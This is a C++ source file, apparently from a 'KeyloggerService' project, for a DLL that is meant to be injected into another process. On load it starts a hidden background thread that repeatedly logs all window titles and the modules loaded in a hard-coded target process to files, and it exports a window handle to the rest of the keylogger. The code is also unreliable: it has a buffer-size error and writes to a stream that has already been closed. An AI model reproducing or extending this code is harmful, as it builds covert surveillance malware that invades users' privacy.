#include <Windows.h>
//#include <winternl.h>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include <vector>
#include "defines.h"
#include <Windows.h>
#include <Psapi.h>
#include <iostream>

#define TRAVERSE_FLAG_DEBUG   (1u << 1)
#pragma comment (lib, "ntdll.lib")

HHOOK g_hHook;
HMODULE hLib;
NTSTATUS status;

DWORD dwCurrentProcessId;
HANDLE hCurrentProcess;
DWORD dwMainThreadId;

HWND window;

// Функция поиска окна
HWND FindWindowInService(DWORD serviceProcessId);

// Вспомогательная функция для перебора окон
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);

// Вспомогательная структура данных, которая будет передаваться в EnumWindowsProc
struct EnumWindowsData
{
    DWORD serviceProcessId; // Идентификатор процесса сервиса
    HWND targetWindow;      // Хэндл искомого окна
};

// Реализация вспомогательной функции для перебора окон
BOOL CALLBACK EnumWindowsProc2(HWND hwnd, LPARAM lParam)
{
    // Получаем данные, которые передали в функцию
    EnumWindowsData* data = (EnumWindowsData*)lParam;

    // Получаем идентификатор процесса, которому принадлежит окно
    DWORD windowProcessId = 0;
    GetWindowThreadProcessId(hwnd, &windowProcessId);

    // Если окно принадлежит сервису идентификатор которого мы передали в функцию,
    // то сохраняем его хэндл в структуре данных и возвращаем FALSE, чтобы остановить перебор
    if (windowProcessId == data->serviceProcessId)
    {
        data->targetWindow = hwnd;
        return FALSE;
    }

    // Если окно не подходит, то продолжаем перебор
    return TRUE;
}

// Реализация функции поиска окна
HWND FindWindowInService(DWORD serviceProcessId)
{
    // Получаем список всех окон на рабочем столе
    EnumWindowsData data;
    data.serviceProcessId = serviceProcessId;
    data.targetWindow = NULL;
    EnumWindows(EnumWindowsProc2, (LPARAM)&data);

    // Возвращаем хэндл найденного окна (если найдено)
    return data.targetWindow;
}



BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    WCHAR windowTitle[MAX_PATH];
    if (GetWindowText(hwnd, windowTitle, sizeof(windowTitle))) {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!!!windowsdll.txt", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << windowTitle << std::endl;
        }
    }
    return TRUE;
}

void getHandleWindow()
{
    window = NULL;
    std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!!!servicesdll.txt", std::ios_base::app);
    if (outFile.is_open()) {
        outFile << "One\n" << std::endl;
    }


    //// Получаем идентификатор процесса нашего сервиса
    //DWORD serviceProcessId = GetCurrentProcessId();

    //// Ищем окно в рамках нашего сервиса
    //HWND targetWindow = FindWindowInService(serviceProcessId);

    HWND targetWindow = FindWindow(L"MyClass", KEYLOGGERWINDOW);
    outFile << "Two\n" << std::endl;
    // Если окно найдено, то можем работать с его хэндлом
    if (targetWindow != NULL)
    {
        window = targetWindow;
    }

    outFile << "Three\n" << std::endl;

    EnumWindows(EnumWindowsProc, 0);

    outFile << "Four\n" << std::endl;

    HMODULE modules[1024];
    DWORD cbNeeded;

    DWORD targetProcessId = 1148; // ID процесса, в котором внедрена библиотека
    HANDLE targetProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetProcessId);
    if (!targetProcess)
    {
        std::cout << "Failed to open target process." << std::endl;
        return;
    }

    if (EnumProcessModules(targetProcess, modules, sizeof(modules), &cbNeeded))
    {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!!!modulesdll.txt", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "One\n" << std::endl;
        }
        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            wchar_t moduleName[MAX_PATH+1];
            if (GetModuleFileNameEx(targetProcess, modules[i], moduleName, sizeof(moduleName)))
            {
                outFile << moduleName << std::endl;
                //if (strstr(moduleName, "myLibrary.dll"))
                //{
                //    FARPROC getData = GetProcAddress(modules[i], "GetData");
                //    if (getData)
                //    {
                //        std::cout << "Found GetData() at address: " << getData << std::endl;
                //        // Вызов функции GetData() внутри процесса
                //        // ...
                //    }
                //}
            }
        }
        outFile.close();
    }

    outFile << "Five\n" << std::endl;

    ////HWND hWnd = FindWindow(NULL, _T("Window Title"));
    ////DWORD dwRemoteThreadId = GetWindowThreadProcessId(WorkerWindow, NULL);
    //DWORD dwThisThreadId = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
    outFile << window << std::endl;
    //AttachThreadInput(dwThreadId, dwThisThreadId, TRUE);

    //// Теперь можно отправлять сообщения в найденное окно

    ////AttachThreadInput(dwThreadId, dwThisThreadId, FALSE);

    if (outFile.is_open())outFile.close();
}

extern "C" __declspec(dllexport) HWND getHandle() {
    return window;
}

void DoTask()
{
    // Выполняем нужные действия
    getHandleWindow();
}

DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    // Бесконечный цикл работы потока
    while (true)
    {
        // Выполняем задачу
        DoTask();


        // Засыпаем на некоторое время
        Sleep(5000);
    }

    return 0;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        if (fdwReason == DLL_PROCESS_ATTACH)
        {
            // Создаем новый поток для выполнения задачи
            HANDLE hThread = CreateThread(NULL, 0, &ThreadProc, NULL, 0, NULL);
            if (!hThread)
                return FALSE;

            CloseHandle(hThread);
        }

        break;
    case DLL_PROCESS_DETACH:
        // удалить хук
        break;
    }
    return TRUE;
}